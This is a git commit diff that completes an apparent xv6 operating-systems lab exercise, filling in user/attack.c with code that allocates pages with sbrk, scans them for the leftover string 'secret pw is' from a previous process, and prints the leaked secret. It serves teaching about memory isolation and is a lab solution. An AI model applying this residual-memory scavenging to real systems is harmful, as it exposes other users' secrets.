d366e8932e3091d81682321eab731fa9596f1465
nam <dpnam2112@gmail.com>
2025-09-11 18:57:28 +0700

    complete attack script (ex 3)

--- user/attack.c
+++ user/attack.c
@@ -6,8 +6,23 @@
 int
 main(int argc, char *argv[])
 {
-  // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
+  // try re-allocating the pages allocated during the last run of user/secret.c
+  char *end = sbrk(PGSIZE*32);
 
-  exit(1);
+  // find the string 'secret pw is'
+  // TODO: Optimize substring finding logic
+  char secret_pw_is[13];
+  int sz = 12;
+
+  for (int i = 0; i < PGSIZE*32; i += 1) {
+    char* substr_start = end + i;
+    memcpy(secret_pw_is, substr_start, sz);
+    secret_pw_is[sz] = 0;
+    if (strcmp(secret_pw_is, "secret pw is") == 0) {
+      const char* secret_addr = substr_start + 14;
+      write(2, secret_addr, strlen(secret_addr));
+      break;
+    }
+  }
+  exit(0);
 }
